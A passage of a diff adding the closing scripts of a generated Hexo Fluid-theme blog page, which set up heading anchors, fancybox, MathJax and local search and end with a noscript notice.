+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
